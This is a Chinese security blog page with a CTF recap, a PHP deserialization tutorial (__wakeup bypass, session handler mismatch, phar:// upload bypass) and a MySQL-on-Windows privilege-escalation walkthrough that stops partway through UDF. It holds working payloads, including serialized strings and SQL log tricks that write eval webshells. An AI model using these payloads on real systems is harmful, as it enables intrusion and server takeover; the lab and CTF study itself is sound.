<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2018/10/22/ISCC2018 信阳杯线下赛小结/"> 
                    ISCC2018 信阳杯线下赛小结 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-10-22   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
            </div>
            <div class="content">
                
                <p>自己巨大的锅..感觉本能拿第一的，却只水了个第二。</p>
<p>从这篇起以后的日子闭关反思</p>
<h2 id="线下ctf"><a href="#线下ctf" class="headerlink" title="线下ctf"></a>线下ctf</h2><p>上午的线下ctf就不说了,一个misc两个逆向。web狗：？？？<br>而且misc巨坑，感觉也是比脑洞，b32出来了对比hex还原再crc32。当时B32解出来有乱码，一直在测试编码的道路上，但结束后问了西工的师傅们才发现路走偏了。要学会习惯用winhex分析，跟原始的zip比对….这就解释了为什么有个504的文件头了..总之ctf体验极差</p>
<h2 id="高地赛"><a href="#高地赛" class="headerlink" title="高地赛"></a>高地赛</h2><p>当时拿到题目是两个私地，一个pwn，一个web.高地也是一个pwn<br>看到网上有这么个吐槽：<br>选手：“ISCC你又出新题啦！”</p>
<p>当时看到题,第一反应是17年的原题,ez的前端太好辨识了..<br>最扯淡的是，给了Mongodb的配置和17年的也一样..甚至连后台账号密码都没变。不过一开始我万能密码也进去了。但自己菜的也是真实，作为第一个打全场的队伍，后来权限没稳住又被别人反超…</p>
<p>Always onload，还有很多要学的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/10/22/ISCC2018 信阳杯线下赛小结/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/13/四个实例递进php反序列化/"> 
                    四个实例递进php反序列化 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-13   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <p>##声明<br>文章首发于安全客：<a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！</p>
<h2 id="D0g3"><a href="#D0g3" class="headerlink" title="D0g3"></a>D0g3</h2><p>为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台，后面会有题不断上新哦~<br>题目平台地址：<a href="http://ctf.d0g3.cn" target="_blank" rel="noopener">http://ctf.d0g3.cn</a><br>题目入口：<a href="http://120.79.33.253:9001" target="_blank" rel="noopener">http://120.79.33.253:9001</a></p>
<p>页面给了源码</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;
$KEY = &quot;D0g3!!!&quot;;
$str = $_GET[&#39;str&#39;];
if (unserialize($str) === &quot;$KEY&quot;)
{
    echo &quot;$flag&quot;;
}
show_source(__FILE__);</code></pre><p>提醒大家补充php序列化知识的水题~</p>
<p>直接上传<code>s:7:&quot;D0g3!!!&quot;</code>即可get flag</p>
<h2 id="绕过魔法函数的反序列化漏洞"><a href="#绕过魔法函数的反序列化漏洞" class="headerlink" title="绕过魔法函数的反序列化漏洞"></a>绕过魔法函数的反序列化漏洞</h2><p>漏洞编号CVE-2016-7124</p>
<h3 id="魔法函数-sleep-和-wakeup"><a href="#魔法函数-sleep-和-wakeup" class="headerlink" title="魔法函数__sleep() 和 __wakeup()"></a>魔法函数__sleep() 和 __wakeup()</h3><p><strong>php文档中定义__wakeup():</strong></p>
<p>unserialize() 执行时会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</strong>wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。__sleep()则相反，是用在序列化一个对象时被调用</p>
<p><img src="https://i.loli.net/2018/09/06/5b90f6d1d8152.png" alt></p>
<h3 id="漏洞剖析"><a href="#漏洞剖析" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>PHP官方给了示例：<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72663</a><br>这个漏洞核心：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>比如下面这个类构造：</p>
<pre><code>class hpdoger{
    public $a = &#39;nice to meet u&#39;;
    }</code></pre><p>序列化这个类得到的结果：</p>
<pre><code>O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;nice to meet u&quot;;}</code></pre><p>简单解释一下这个序列化字符串：<br>O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数<br>大括号内分别是：属性名类型、长度、名称；值类型、长度、值</p>
<p>正常情况下，反序列化一个类得到的结果：<br><img src="https://i.loli.net/2018/09/06/5b90f7f9ae0d0.jpg" alt></p>
<p>析构方法和__wakeup都能够执行</p>
<p>如果我们把传入的序列化字符串的属性个数更改成大于1的任何数</p>
<pre><code>O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;}</code></pre><p>得到的结果如图，__wakeup没有被执行，但是执行了析构函数<br><img src="https://i.loli.net/2018/09/06/5b90f8ecc8319.png" alt></p>
<p>假如我们的demo是这样的呢?</p>
<pre><code>&lt;?php
class A{
    var $a = &quot;test&quot;;
    function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;a);
        fclose($fp);
    }
    function __wakeup()
        {
            foreach(get_object_vars($this) as $k =&gt; $v) {
                    $this-&gt;$k = null;
            }
        }
}
$hpdoger = $_POST[&#39;hpdoger&#39;];
$clan = unserialize($hpdoger);
?&gt;</code></pre><p>每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。</p>
<p>poc:</p>
<pre><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></pre><h3 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h3><p>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
<h2 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h2><h3 id="Session序列化机制"><a href="#Session序列化机制" class="headerlink" title="Session序列化机制"></a>Session序列化机制</h3><p>提到这个漏洞，就得先知道什么叫Session序列化机制。</p>
<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p>
<p>PHP处理器的三种序列化方式：<br>| 处理器         | 对应的存储格式    |<br>| —————— |:———————|<br>| php_binary      | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |<br>| php           | 键名＋竖线＋经过serialize()函数反序列处理的值   |<br>|php_serialize |serialize()函数反序列处理数组方式|</p>
<p>配置文件php.ini中含有这几个与session存储配置相关的配置项：</p>
<pre><code>session.save_path=&quot;&quot;   --设置session的存储路径,默认在/tmp
session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php</code></pre><p>一个简单的demo(session.php)认识一下存储过程：</p>
<pre><code>&lt;?php
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();

$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];

?&gt;</code></pre><p>访问页面</p>
<pre><code>http://localhost/test/session.php?hpdoger=lover</code></pre><p>在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5<br>因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：</p>
<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:5:&quot;lover&quot;;}</code></pre><p>如果选择的序列化处理方式为php，即<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</code>,则存储内容为：</p>
<pre><code>hpdoger|s:5:&quot;lover&quot;;</code></pre><h3 id="漏洞剖析-1"><a href="#漏洞剖析-1" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
<p>这里提供一个demo：</p>
<p>存储Session页面</p>
<pre><code>/*session.php*/

&lt;?php
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();

$_SESSION[&#39;hpdoger&#39;] = $_GET[&#39;hpdoger&#39;];

?&gt;</code></pre><p>可利用页面</p>
<pre><code>/*test.php*/

&lt;?php 
ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
session_start();

class hpdoger{
    var $a;

    function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;a);
        fclose($fp);
    }
}

?&gt;</code></pre><p>访问第一个页面的poc:<br><img src="https://i.loli.net/2018/09/06/5b90f6078e2c6.png" alt></p>
<p>/tmp目录下生成的session文件内容：</p>
<pre><code>a:1:{s:7:&quot;hpdoger&quot;;s:52:&quot;|O:7:&quot;hpdoger&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}</code></pre><p>再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:</p>
<pre><code>$_SESSION[&#39;hpdoger&#39;] = new hpdoger();
$_SESSION[&#39;hpdoger&#39;]-&gt;a = &#39;&lt;?php phpinfo()?&gt;&#39;;</code></pre><p>在指定的目录D:\phpStudy\PHPTutorial\WWW\test\shell.php中会写入内容<code>&lt;?php phpinfo()?&gt;</code><br><img src="https://i.loli.net/2018/09/06/5b90f607d6b3a.jpg" alt></p>
<h3 id="jarvisoj-web的一道SESSION反序列化"><a href="#jarvisoj-web的一道SESSION反序列化" class="headerlink" title="jarvisoj-web的一道SESSION反序列化"></a>jarvisoj-web的一道SESSION反序列化</h3><p>题目入口(<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a>)<br>Index页给源码：</p>
<pre><code>&lt;?php
//A webshell is wait for you
ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this-&gt;mdzz = &#39;phpinfo();&#39;;
    }

    function __destruct()
    {
        eval($this-&gt;mdzz);
    }
}
if(isset($_GET[&#39;phpinfo&#39;]))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents(&#39;index.php&#39;));
}
?&gt;</code></pre><p>看到ini_set(‘session.serialize_handler’, ‘php’);</p>
<p>暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()<br><img src="https://i.loli.net/2018/09/07/5b927fb850e32.png" alt></p>
<p>这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。</p>
<p>构造上传的表单poc，列出当前目录:</p>
<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;</code></pre><p>通过phpinfo页面查看当前路径<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code><br><img src="https://i.loli.net/2018/09/07/5b927fb844eb0.png" alt></p>
<p>读文件就行</p>
<pre><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;}</code></pre><p>得到flag</p>
<pre><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></pre><h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
<h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p>
<p>这里摘出创宇提供的四部分结构概要：<br>1、a stub<br>识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub</p>
<p>2、a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata–设置phar归档元数据</p>
<p>3、 the file contents<br>被压缩文件的内容。</p>
<p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
<h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><p>要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）</p>
<p>PHP内置phar类，其他的一些方法如下：</p>
<pre><code>$phar = new Phar(&#39;phar/hpdoger.phar&#39;); //实例一个phar对象供后续操作
$phar-&gt;startBuffering()  //开始缓冲Phar写操作
$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo \&#39;this is test file\&#39;;&#39;); //以字符串的形式添加一个文件到 phar 档案
$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) //把一个目录下的文件归档到phar档案
$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</code></pre><h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
<p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的<strong>文件操作函数</strong>又很多，所以这是一种不错的绕过+执行的方法。</p>
<h3 id="文件上传绕过deomo"><a href="#文件上传绕过deomo" class="headerlink" title="文件上传绕过deomo"></a>文件上传绕过deomo</h3><p>自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下</p>
<p><strong>前端上传：</strong></p>
<pre><code>&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
&lt;/form&gt;</code></pre><p><strong>后端验证：</strong></p>
<pre><code>/*upload.php*/
&lt;?php
    /*返回后缀名函数*/
    function getExt($filename){
        return substr($filename,strripos($filename,&#39;.&#39;)+1);
    }

    /*检测MIME类型是否为gif*/
    if($_FILES[&#39;hpdoger&#39;][&#39;type&#39;] != &quot;image/gif&quot;){
        echo &quot;Not allowed !&quot;;
        exit;
    }
    else{
        $filenameExt = strtolower(getExt($_FILES[&#39;hpdoger&#39;][&#39;name&#39;]));    /*提取后缀名*/

        if($filenameExt != &#39;gif&#39;){
            echo &quot;Not gif !&quot;;
        }
        else{
            move_uploaded_file($_FILES[&#39;hpdoger&#39;][&#39;tmp_name&#39;], $_FILES[&#39;hpdoger&#39;][&#39;name&#39;]);
            echo &quot;Successfully！&quot;;
        }
    }
?&gt;</code></pre><p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
<p>抓包更改content-type为 image/gif再次上传<br><img src="https://i.loli.net/2018/09/07/5b9280606915f.png" alt><br><img src="https://i.loli.net/2018/09/07/5b9280606784b.png" alt></p>
<p>可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传</p>
<p>php环境编译生成一个phar文件，代码如下：</p>
<pre><code>&lt;?php 
class not_useful{
    var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;
}

@unlink(&quot;hpdoger.phar&quot;);
$test = new not_useful();
$phar = new Phar(&quot;hpdoger.phar&quot;);

$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
$phar-&gt;setMetadata($test);
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);

$phar-&gt;stopBuffering();
?&gt;</code></pre><p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
<p>gif头、phar识别序列、序列化后的字符串都具备</p>
<p>上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif<br><img src="https://i.loli.net/2018/09/07/5b92808e8c0bf.png" alt></p>
<h3 id="利用Phar-伪协议demo"><a href="#利用Phar-伪协议demo" class="headerlink" title="利用Phar://伪协议demo"></a>利用Phar://伪协议demo</h3><p>我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。</p>
<p>代码如下:reapperance.php</p>
<pre><code>&lt;?php
    $recieve = $_GET[&#39;recieve&#39;];

    /*写入文件类操作*/
    class not_useful{
        var $file;

        function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径
        fputs($fp,$this-&gt;file);
        fclose($fp);
    }

    file_get_contents($recieve);

?&gt;</code></pre><p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
<p>若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：<br><img src="https://i.loli.net/2018/09/07/5b92808e93634.png" alt></p>
<h3 id="可利用的文件操作函数"><a href="#可利用的文件操作函数" class="headerlink" title="可利用的文件操作函数"></a>可利用的文件操作函数</h3><p>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
<h3 id="各种文件头"><a href="#各种文件头" class="headerlink" title="各种文件头"></a>各种文件头</h3><table>
<thead>
<tr>
<th>类型</th>
<th>标识</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG</td>
<td>头标识ff d8 ,结束标识ff d9</td>
</tr>
<tr>
<td>PNG</td>
<td>头标识89 50 4E 47 0D 0A 1A 0A</td>
</tr>
<tr>
<td>GIF</td>
<td>头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a</td>
</tr>
<tr>
<td>BMP</td>
<td>头标识(2 bytes) 42 4D BM</td>
</tr>
</tbody></table>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>jarvisoj-web-writeup(<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO</a>)<br>利用 phar 拓展 php 反序列化漏洞攻击面(<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/13/四个实例递进php反序列化/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/08/基于Windows下mysql的一些提权分析/"> 
                    基于Windows下mysql的一些提权分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-08   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq…</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
<h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
<h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>这里我用暗月的马，改了一些参数。后面我会把所有工具打包</p>
<h3 id="访问提权马"><a href="#访问提权马" class="headerlink" title="访问提权马"></a>访问提权马</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224415-309ea058-9987-1.png" alt></p>
<h3 id="导出dll到指定目录"><a href="#导出dll到指定目录" class="headerlink" title="导出dll到指定目录"></a>导出dll到指定目录</h3><p>利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求</p>
<ul>
<li><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
</li>
<li><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
</li>
</ul>
<p><strong>但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。</strong></p>
<p>靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用<code>select @@basedir;</code>获取安装目录。</p>
<p>在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建</p>
<p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
